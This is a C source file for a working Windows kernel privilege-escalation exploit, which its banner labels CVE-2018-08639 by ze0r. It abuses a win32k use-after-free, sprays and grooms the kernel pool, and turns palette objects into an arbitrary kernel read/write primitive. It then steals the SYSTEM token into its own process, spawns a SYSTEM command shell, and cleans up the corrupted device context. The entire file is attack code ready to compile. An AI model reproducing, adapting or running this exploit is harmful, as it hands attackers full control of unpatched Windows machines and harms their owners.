#include "stdio.h"
#include "windows.h"
#include "psapi.h"

EXTERN_C VOID FuncInt3();
typedef unsigned __int64 QWORD, *PQWORD;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct
{
	QWORD UniqueProcessIdOffset;
	QWORD TokenOffset;
	QWORD DCoffset;
} VersionSpecificConfig;


HDC			hDC_Writer[1000];
CHAR		flag[0x80] = "ze0r is so cool!\x00\x00\x00";
QWORD		buf[0x20];
ULONG64		ntOsBase;

DWORD		win32kSize = 0xFFFFFFFF;
BYTE		*win32kFilebuffer;

HPALETTE	hPltMgr = 0;
HPALETTE	hPltWkr = 0;
HPALETTE	hPalettes[4000];

QWORD		NtUserUnregisterClass;
QWORD		NtGdiSetLinkedUFIs;

//VersionSpecificConfig gConfig = { 0xb4, 0xf8 };  //win 7
VersionSpecificConfig gConfig;

typedef void (WINAPI * RTLGetVersion)(OSVERSIONINFOEXW *);
RTLGetVersion pfnRtlGetVersion;

typedef BOOL (WINAPI * ENUMDeviceDrivers)(LPVOID  *lpImageBase,DWORD   cb,LPDWORD lpcbNeede);
ENUMDeviceDrivers pfnEnumDeviceDrivers;

typedef int (WINAPI *NTGdiSetLinkedUFIs)(HDC hdc, CHAR *buf, int len);
typedef void (WINAPI *NTUserUnregisterClass)(PUNICODE_STRING pClsName, HINSTANCE inst, PULONG64 p);
NTGdiSetLinkedUFIs pfnNtGdiSetLinkedUFIs;
NTUserUnregisterClass pfnNtUserUnregisterClass;

void ReadMem(QWORD Addr, UINT len) {
	buf[0] = Addr;
	SetPaletteEntries(hPltMgr, 0x3C, 2, (LPPALETTEENTRY)buf);
	GetPaletteEntries(hPltWkr, 0, len, (LPPALETTEENTRY)buf);
}

ULONG64 GetNTOsBase()
{
	DWORD	needed = 0;
	ULONG64 Bases[0x1000];
	ULONG64 krnlbase = 0;
	if (pfnEnumDeviceDrivers((LPVOID *)&Bases, sizeof(Bases), &needed)) {
		krnlbase = Bases[0];
	}
	return krnlbase;
}

QWORD PsInitialSystemProcess()
{
	ULONG64		res = 0;
	ULONG64		Module = (ULONG64)LoadLibraryA("ntoskrnl.exe");
	ULONG64		Addr = (ULONG64)GetProcAddress((HMODULE)Module, "PsInitialSystemProcess");

	if (ntOsBase) {
		ReadMem(Addr - Module + ntOsBase, 2);
		res = buf[0];
	}

	FreeLibrary((HMODULE)Module);
	return res;
}

ULONG64 PsGetCurrentProcess(ULONG64 sysEPS)
{
	ULONG64		pEPROCESS = sysEPS;
	ReadMem(pEPROCESS + gConfig.UniqueProcessIdOffset, 4);
	
	while (TRUE) {
		pEPROCESS = buf[1] - gConfig.UniqueProcessIdOffset - sizeof(ULONG64);
		ReadMem(pEPROCESS + gConfig.UniqueProcessIdOffset, 4);
		if (GetCurrentProcessId() == buf[0]) {
			return pEPROCESS;
		}
	}
}

DWORD GetEngUnlockSurfaceOffset() {

	DWORD i = 0;
	DWORD  PointerToRawData = 0;
	DWORD VirtualAddress = 0;
	PIMAGE_EXPORT_DIRECTORY pExportTable = 0;
	while (i < win32kSize) {
		if (*((PQWORD)(win32kFilebuffer + i)) == 0x61746164652e) {
			VirtualAddress = *((PDWORD)(win32kFilebuffer + i + 0xC));   //0x2f6000
			PointerToRawData = *((PDWORD)(win32kFilebuffer + i + 0x14)); //0x2e2c00  
			break;
		}
		i++;
	}
	pExportTable = (PIMAGE_EXPORT_DIRECTORY)(win32kFilebuffer + PointerToRawData);
	
	DWORD pNameStringList = (pExportTable->AddressOfNames) - VirtualAddress + PointerToRawData + (DWORD)win32kFilebuffer;
	DWORD NumberOfNames = pExportTable->NumberOfNames;

	i = 0;
	PQWORD pFunctionNameString = 0;
	while (i < pExportTable->NumberOfNames) {
		pFunctionNameString = (PQWORD)(*((PDWORD)(pNameStringList + (i * 4))) - VirtualAddress + PointerToRawData + win32kFilebuffer);
		//EngUnlockSurface
		if ((*pFunctionNameString == 0x636f6c6e55676e45) && (*(pFunctionNameString + 1) == 0x656361667275536b)) {
			break;
		}
		i++;
	}
	DWORD AddressOfFunctions = (pExportTable->AddressOfFunctions) - VirtualAddress + PointerToRawData + (DWORD)win32kFilebuffer;
	DWORD EngUnlockSurfaceOffset = *(PDWORD)(AddressOfFunctions + i * 4);

	return EngUnlockSurfaceOffset;
}

QWORD GetgpentHmgr()
{
	BYTE		*pOPCode;
	DWORD		offset = 0;
	ULONG64		Module = (ULONG64)LoadLibraryA("ntoskrnl.exe");
	ULONG64		Addr = (ULONG64)GetProcAddress((HMODULE)Module, "KeCapturePersistentThreadState");

	FreeLibrary((HMODULE)Module);

	if (!ntOsBase) {
		return 0;
	}
	//get PsLoadedModuleList address
	ReadMem(Addr - Module + ntOsBase + 0xA0, 22);
	pOPCode = (BYTE *)buf;
	while ( pOPCode - (BYTE *)buf < 0x60 ) {
		if (*((DWORD *)pOPCode) == 0x8664) {
			offset = *((DWORD *)(pOPCode + 0xb));
			break;
		}
		pOPCode++;
	}

	if (!offset) {
		return 0;
	}
	ZeroMemory(buf, 0x20 * 8);
	
	QWORD wink32kAddr;
	QWORD CurrentModuleInfo;
	QWORD PsLoadedModuleListAddr = Addr - Module + ntOsBase + 0xA0 + ((ULONG64)pOPCode - (ULONG64)buf) + 7 + 8 + offset ;
	//get win32k.sys module address
	ReadMem(PsLoadedModuleListAddr, 2);
	CurrentModuleInfo = buf[0];

	while (CurrentModuleInfo) {
		ReadMem(CurrentModuleInfo + 0x60, 2);
		ReadMem(buf[0], 4);
		if ((buf[0] == 0x0033006e00690077) && (buf[1] == 0x0073002e006b0032)) {
			ReadMem(CurrentModuleInfo + 0x30, 2);
			wink32kAddr = buf[0];
			break;
		}
		else {
			ReadMem(CurrentModuleInfo, 2);
			CurrentModuleInfo = buf[0];
		}
	}
	if (!wink32kAddr) {
		return 0;
	}

	DWORD EngUnlockSurfaceOffset = GetEngUnlockSurfaceOffset();
	QWORD pfnEngUnlockSurface = wink32kAddr + EngUnlockSurfaceOffset;
	//find EngUnlockSurface function
	//win2008
	ReadMem(pfnEngUnlockSurface,22);
	pOPCode = (BYTE *)buf;
	offset = 0;
	QWORD gpentHmgr = 0;
	QWORD pfnHmgReferenceCheckLock = 0;
	while (pOPCode - (BYTE *)buf < 0x60) {
		
		if (*pOPCode == 0x42) {
			offset = *(PDWORD)(pOPCode - 4);
			gpentHmgr = (QWORD)(pfnEngUnlockSurface + offset + (pOPCode - (PBYTE)buf));
			break;
		}
		pOPCode++;
	}
	
	//or win2008 R2 and less
	if (offset == 0) {
		pOPCode = (BYTE *)buf;
		while (pOPCode - (BYTE *)buf < 0x60) {
			if ((*pOPCode == 0x4C) && (*(pOPCode - 5) == 0xE8)) {
				offset = *(PDWORD)(pOPCode - 4);
				pfnHmgReferenceCheckLock = (QWORD)(pfnEngUnlockSurface + offset + (pOPCode - (PBYTE)buf));
				break;
			}
			pOPCode++;
		}
	}

	if (pfnHmgReferenceCheckLock) {
		pOPCode = (BYTE *)buf;
		ReadMem(pfnHmgReferenceCheckLock, 22);
		while (pOPCode - (BYTE *)buf < 0x60) {
			if (*pOPCode == 0x48) {
				offset = *(PDWORD)(pOPCode + 3);
				gpentHmgr = (QWORD)(pfnHmgReferenceCheckLock + offset + (pOPCode - (PBYTE)buf) + 7);
				break;
			}
			pOPCode++;
		}
	}

	ReadMem(gpentHmgr, 2);
	return buf[0];
}

HDC FindCorruptDC() {

	QWORD res[0x80 / 4];
	PDWORD  buf = (PDWORD)flag;
	*buf = 0;
	*(buf + 1) = 0;
	*(buf + 2) = 0x501;
	*(buf + 3) = 0x1b;
	for (int i = 0; i < 1000; i++) {
		pfnNtGdiSetLinkedUFIs(hDC_Writer[i], (CHAR *)buf, 2);
		if (!GetPaletteEntries(hPltMgr, 0x1C, 0x10, (LPPALETTEENTRY)res)) {
			*(buf + 3) = 0xfff;
			pfnNtGdiSetLinkedUFIs(hDC_Writer[i], (CHAR *)buf, 2);
			return hDC_Writer[i];
		}
	}

	return 0;
}

VOID FixCorruptDC(QWORD gpentHmgr, HDC CorruptDC){

	DWORD pos = (DWORD)CorruptDC & 0xfff;
	ReadMem(gpentHmgr + (pos * 0x18), 2);

	QWORD pDC = buf[0];
	buf[0] = pDC + gConfig.DCoffset;
	SetPaletteEntries(hPltMgr, 0x3C, 2, (LPPALETTEENTRY)buf);

	buf[0] = 0;
	buf[1] = 0;
	SetPaletteEntries(hPltWkr, 0, 4, (LPPALETTEENTRY)buf); 
}

LPACCEL		lpAccel;
HACCEL		hAccel_HANDLE[10000];
HACCEL		hAccel_0xE00[3000];
HACCEL		hAccel_0x200[1500];

void PoolFengShui() {

	for (int i = 0; i < 10000; i++) {
		hAccel_HANDLE[i] = CreateAcceleratorTableW(lpAccel, 0x20);
	}

	for (int i = 0; i < 3000; i++) {
		DestroyAcceleratorTable(hAccel_HANDLE[i]);
		//hAccel_0xE00[i] = CreateAcceleratorTableW(lpAccel, 0x250);  //x86
		hAccel_0xE00[i] = CreateAcceleratorTableW(lpAccel, 0x24B);
	}

	for (int i = 0; i < 1500; i++) {
		DestroyAcceleratorTable(hAccel_HANDLE[i + 3000]);
		//hAccel_0x200[i] = CreateAcceleratorTableW(lpAccel, 0x53);   //x86
		hAccel_0x200[i] = CreateAcceleratorTableW(lpAccel, 0x48);
	}

	for (int i = 6000; i < 10000; i++) {
		DestroyAcceleratorTable(hAccel_HANDLE[i]);
	}

	for (int i = 0; i < 1000; i++) {
		hDC_Writer[i] = CreateCompatibleDC(NULL);
	}
}

void GetMgrAndWkr() {

	QWORD res[0x80 / 4];
	PDWORD  buf = (PDWORD)flag;
	*buf = 0;
	*(buf + 1) = 0;
	*(buf + 2) = 0x501;
	*(buf + 3) = 0xfff;
	for (int i = 0; i < 1000; i++) {
		pfnNtGdiSetLinkedUFIs(hDC_Writer[i], (CHAR *)buf, 2);
	}
	
	ZeroMemory(res, 0x80 / 4);
	for (int i = 0; i < 4000; i++) {
		if (GetPaletteEntries(hPalettes[i], 0x1b, 0x10, (LPPALETTEENTRY)res)) {
			hPltMgr = hPalettes[i];
			hPltWkr = (HPALETTE)((res[0]<<32) * 0x100000000 + (res[0]>>32));
		}
	}

	if ((hPltMgr == 0) || (hPltWkr == 0)) {
		printf("[*] Cannot found Worker, Maybe patched!\n");
		ExitProcess(0);
	}

	for (int i = 0; i < 4000; i++) {
		if ((hPalettes[i] != hPltMgr) && (hPalettes[i] != hPltWkr)) {
			DeleteObject(hPalettes[i]);
		}
	}

	for (int i = 0; i < 3000; i++) {
		DestroyAcceleratorTable(hAccel_0xE00[i]);
	}
}

VOID GetSystem() {

	ULONG64		SelfToken = 0;
	ULONG64		SystemToken = 0;
	QWORD		SystemEPS;
	QWORD		CurrentEPS;

	STARTUPINFO stStartUpInfo = { sizeof(stStartUpInfo) };
	PROCESS_INFORMATION pProcessInfo;
	CHAR	cmd[] = "c:\\\\windows\\\\system32\\\\cmd.exe";

	SystemEPS = PsInitialSystemProcess();
	CurrentEPS = PsGetCurrentProcess(SystemEPS);

	printf("[*] GOT System EPROCESS!\n");
	ReadMem(SystemEPS + gConfig.TokenOffset, 2);
	SystemToken = buf[0];
	buf[0] = CurrentEPS + gConfig.TokenOffset;
	SetPaletteEntries(hPltMgr, 0x3C, 2, (LPPALETTEENTRY)buf);

	GetPaletteEntries(hPltWkr, 0, 2, (LPPALETTEENTRY)&SelfToken);
	SetPaletteEntries(hPltWkr, 0, 2, (LPPALETTEENTRY)&SystemToken);

	printf("[*] Swaping shell.\n\n");
	ZeroMemory(&stStartUpInfo, sizeof(STARTUPINFO));
	stStartUpInfo.cb = sizeof(STARTUPINFO);
	stStartUpInfo.dwFlags = STARTF_USESHOWWINDOW;
	stStartUpInfo.wShowWindow = 1;	
	CreateProcess(cmd, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &stStartUpInfo, &pProcessInfo);

	//Open win32k;
	win32kSize = 0xFFFFFFFF;
	CHAR FilePath[40] = "C:\\Windows\\System32\\win32k.sys";
	GetSystemDirectoryA(FilePath, 0x14);
	FilePath[19] = 0x5c;
	HANDLE hFile = CreateFileA(FilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	win32kSize = GetFileSize(hFile, &win32kSize);
	win32kFilebuffer = (BYTE *)malloc(win32kSize);
	ReadFile(hFile, win32kFilebuffer, win32kSize, &win32kSize, NULL);
	CloseHandle(hFile);

	//restor token
	SetPaletteEntries(hPltWkr, 0, 2, (LPPALETTEENTRY)&SelfToken);
}

int main()
{
	printf("////////////////////////////////////////////////////////\n");
	printf("//                                                    //\n");
	printf("//             CVE-2018-08639 EXPLOIT                  //\n");
	printf("//                                  Date  : 2019/2/21 //\n");
	printf("//                                  Author: ze0r      //\n");
	printf("////////////////////////////////////////////////////////\n\n");

	ULONG64				a = 0xa;
	HDESK				hNewDesk;
	HWND				hWndCloneCls;
	CHAR				RegMenuName[240];
	CHAR				NewMenuName[] = "ze0r";
	WNDCLASSEXA			wndClass;
	HMODULE				hInst = GetModuleHandleA(NULL);
	PUNICODE_STRING		pClassName = (PUNICODE_STRING)malloc(sizeof(UNICODE_STRING));
	OSVERSIONINFOEXW	*OSInfo = (OSVERSIONINFOEXW *)malloc(sizeof(OSVERSIONINFOEXW));;
	
	OSInfo->dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);

	memset(RegMenuName, 0x78, 240);
	RegMenuName[239] = 0;

	pClassName->Length = 0x18;
	pClassName->MaximumLength = 0x1a;
	pClassName->Buffer = L"WNDCLASSMAIN";

	//size of Palette = 0x100;
	LOGPALETTE *lPalette = (LOGPALETTE*)malloc(0xA4);
	memset(lPalette, 0x55, 0xA4);
	lPalette->palNumEntries = 0x16;
	lPalette->palVersion = 0x300;


	wndClass = { 0 };
	wndClass.cbSize = sizeof(WNDCLASSEXW);
	wndClass.lpfnWndProc = DefWindowProc;
	wndClass.cbClsExtra = 0;
	wndClass.cbWndExtra = 0;
	wndClass.hInstance = hInst;
	wndClass.lpszMenuName = RegMenuName;
	wndClass.lpszClassName = "WNDCLASSMAIN";

	lpAccel = (LPACCEL)malloc(sizeof(ACCEL) * 2);
	SecureZeroMemory(lpAccel, sizeof(ACCEL));

	pfnRtlGetVersion = (RTLGetVersion)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlGetVersion");
	pfnEnumDeviceDrivers = (ENUMDeviceDrivers)GetProcAddress(GetModuleHandle("kernel32.dll"), "K32EnumDeviceDrivers");
	pfnNtGdiSetLinkedUFIs = (NTGdiSetLinkedUFIs)((QWORD)GetProcAddress(GetModuleHandle("GDI32.dll"), "SetMagicColors") - 0x14);
	pfnNtUserUnregisterClass = (NTUserUnregisterClass)((QWORD)GetProcAddress(GetModuleHandle("USER32.dll"), "UnregisterClassW") - 0x14);
	
	pfnRtlGetVersion(OSInfo);
	switch (OSInfo->dwMajorVersion) {
	case 5:
		if ((OSInfo->dwMinorVersion == 2) && (OSInfo->wProductType != VER_NT_WORKSTATION)) {
			printf("[*] Operating System: Windows 2003.\n");
		}
		else
		{
			printf("[*] Unsupported System.\n");
			return 0;
		}
		break;
	case 6:
		if (OSInfo->dwMinorVersion == 0) {
			if (OSInfo->wProductType == VER_NT_WORKSTATION) {
				printf("[*] Operating System: Windows Vista.\n");
			}
			else {

				gConfig.UniqueProcessIdOffset = 0x0e0;
				gConfig.TokenOffset = 0x168;
				gConfig.DCoffset = 0x128;

				pfnEnumDeviceDrivers = (ENUMDeviceDrivers)GetProcAddress(LoadLibraryA("Psapi.dll"), "EnumDeviceDrivers");
				pfnNtUserUnregisterClass = (NTUserUnregisterClass)((QWORD)GetProcAddress(GetModuleHandle("USER32.dll"), "IsServerSideWindow") - 0x14);
				printf("[*] Operating System: Windows Server 2008.\n");
			}
			break;
		}
		if (OSInfo->dwMinorVersion == 1) {
			if (OSInfo->wProductType == VER_NT_WORKSTATION) {
				printf("[*] Operating System: Windows 7.\n");
			}
			else {
				gConfig.UniqueProcessIdOffset = 0x180;
				gConfig.TokenOffset = 0x208;
				gConfig.DCoffset = 0x138;
				printf("[*] Operating System: Windows Server 2008 R2.\n");
			}
			break;
		}
		if (OSInfo->dwMinorVersion == 2) {
			if (OSInfo->wProductType == VER_NT_WORKSTATION) {
				printf("[*] Operating System: Windows 8.\n");
			}
			else {
				printf("[*] Operating System: Windows Server 2012.\n");
			}
			break;
		}
		if (OSInfo->dwMinorVersion == 3) {
			if (OSInfo->wProductType == VER_NT_WORKSTATION) {
				printf("[*] Operating System: Windows 8.1.\n");
			}
			else {
				printf("[*] Operating System: Windows Server 2012 R2.\n");
			}
			break;
		}
		printf("[*] Unsupported System.\n");
		return 0;
	case 10:
		if (OSInfo->dwMinorVersion == 0) {
			if (OSInfo->wProductType == VER_NT_WORKSTATION) {
				printf("[*] Operating System: Windows 10.\n");
			}
			else {
				printf("[*] Operating System: Windows Server 2016 or Windows Server 2019.\n");
			}
			break;
		}
		break;
	}

	ntOsBase = GetNTOsBase();
	PoolFengShui();

	//Register window class
	printf("[*] Register Class.\n");
	RegisterClassExA(&wndClass);

	//Switch to a new Desktop
	hNewDesk = CreateDesktopA("ze0r", NULL, NULL, DF_ALLOWOTHERACCOUNTHOOK, GENERIC_ALL, NULL);
	SetThreadDesktop(hNewDesk);
	hWndCloneCls = CreateWindowA("WNDCLASSMAIN", "CVE", WS_DISABLED, 0, 0, 0, 0, nullptr, nullptr, hInst, nullptr);
	CloseDesktop(hNewDesk);

	//Trigger Release memory
	SetClassLongPtrA(hWndCloneCls, GCLP_MENUNAME, (LONG64)NewMenuName);
	
	//Reuse memory
	for (int i = 0; i < 1000; i++) {
		pfnNtGdiSetLinkedUFIs(hDC_Writer[i], flag, 0x3b);
	}
	
	//Trigger vul;
	printf("[*] Trigger vul.\n");
	DestroyWindow(hWndCloneCls);
	pfnNtUserUnregisterClass(pClassName, hInst, &a);
	
	//Destroy and ReAlloc memory,this will cause memory merge;
	for (int i = 0; i < 3000; i++) {
		DestroyAcceleratorTable(hAccel_0xE00[i]);
	}
	for (int i = 0; i < 3000; i++) {
		hAccel_0xE00[i] = CreateAcceleratorTableW(lpAccel, 0x225);
	}
	
	//Alloc Palette
	for (int i = 0; i < 4000; i++) {
		hPalettes[i] = CreatePalette(lPalette);
	}
	
	printf("[*] Find Manager and Worker.\n");
	GetMgrAndWkr();
	GetSystem();
	
	QWORD gpentHmgr = GetgpentHmgr();
	HDC	hDCcorrupt = FindCorruptDC();
	FixCorruptDC(gpentHmgr, hDCcorrupt);

	for (int i = 0; i < 1000; i++) {
		 DeleteDC(hDC_Writer[i]);
	}

	return 0;
}
